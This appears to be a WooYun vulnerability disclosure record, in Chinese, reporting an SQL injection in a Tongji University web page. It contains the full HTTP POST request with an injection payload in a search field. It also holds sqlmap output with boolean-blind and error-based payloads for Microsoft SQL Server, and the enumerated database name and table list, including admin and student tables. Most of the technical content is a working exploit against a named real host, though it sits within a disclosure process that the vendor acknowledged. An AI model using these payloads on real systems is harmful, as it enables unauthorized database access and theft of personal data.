wybug_title: 同济大学某站存在SQL注入漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-12-20：	细节已通知厂商并且等待厂商处理中									2015-12-20：	厂商已经确认，细节仅向厂商公开									2015-12-30：	细节向核心白帽子及相关领域专家公开									2016-01-09：	细节向普通白帽子公开									2016-01-19：	细节向实习白帽子公开									2016-02-01：	细节向公众公开  简要描述：  详细说明：  
POST /BookSelect.aspx?flag=7&info_lb=66 HTTP/1.1Content-Length: 405Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://mat.tongji.edu.cnCookie: ASPSESSIONIDAABDBTSR=OFDPNMFBKILACIEFPINGINEKHost: mat.tongji.edu.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*btnSearch=%cb%d1%cb%f7&anpBooksList_input=1&txtBookName=-1' OR 1=1* or 'Cp7Piha0'=' &txtIndexNo=1&txtISBN=1&txtPress=1&txtWriter=1&__VIEWSTATE=/wEPDwUKMjA1Nzc0MTg5OA9kFgJmD2QWBAIVDxYCHgtfIUl0ZW1Db3VudAIPZAIXDw8WBh4LUmVjb3JkY291bnRmHghQYWdlU2l6ZQIPHg5DdXN0b21JbmZvVGV4dAUt5YWxIDk2IOmhtSzlvZPliY3nrKwgMSDpobUs5YWxIDE0Mzkg5p2h6K6w5b2VZGRkfAiE3b8YLhIEYbBpc%2bfFiTWeH8Y%3d


   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: btnSearch=%cb%d1%cb%f7&anpBooksList_input=1&txtBookName=-1' OR 1=1) AND 7492=7492 AND (5528=5528 or 'Cp7Piha0'=' &txtIndexNo=1&txtISBN=1&txtPress=1&txtWriter=1&__VIEWSTATE=/wEPDwUKMjA1Nzc0MTg5OA9kFgJmD2QWBAIVDxYCHgtfIUl0ZW1Db3VudAIPZAIXDw8WBh4LUmVjb3JkY291bnRmHghQYWdlU2l6ZQIPHg5DdXN0b21JbmZvVGV4dAUt5YWxIDk2IOmhtSzlvZPliY3nrKwgMSDpobUs5YWxIDE0Mzkg5p2h6K6w5b2VZGRkfAiE3b8YLhIEYbBpc+fFiTWeH8Y=    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: btnSearch=%cb%d1%cb%f7&anpBooksList_input=1&txtBookName=-1' OR 1=1) AND 6881=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (6881=6881) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113))) AND (7312=7312 or 'Cp7Piha0'=' &txtIndexNo=1&txtISBN=1&txtPress=1&txtWriter=1&__VIEWSTATE=/wEPDwUKMjA1Nzc0MTg5OA9kFgJmD2QWBAIVDxYCHgtfIUl0ZW1Db3VudAIPZAIXDw8WBh4LUmVjb3JkY291bnRmHghQYWdlU2l6ZQIPHg5DdXN0b21JbmZvVGV4dAUt5YWxIDk2IOmhtSzlvZPliY3nrKwgMSDpobUs5YWxIDE0Mzkg5p2h6K6w5b2VZGRkfAiE3b8YLhIEYbBpc+fFiTWeH8Y=---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005Database: Tongjicailiao[35 tables]+----------------+| Awards         || Books          || Dircatin       || Normal         || Papers         || Patents        || ReplyMessage   || ResearchBook   || Resourse       || StudentInfo    || TeacherInfo    || ThreePaper     || Users          || WriteMessage   || admin_info     || admin_info_en  || adminlog       || adminlog_en    || adminpower     || adminpower_en  || article        || article_type   || ask            || comments       || count          || dtproperties   || info_type      || info_type_en   || information    || information_en || mark           || mark_en        || menu           || menu_en        || users_xiaoji   |+----------------+

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-20 15:50 厂商回复： 感谢提醒！ 最新状态： 暂无
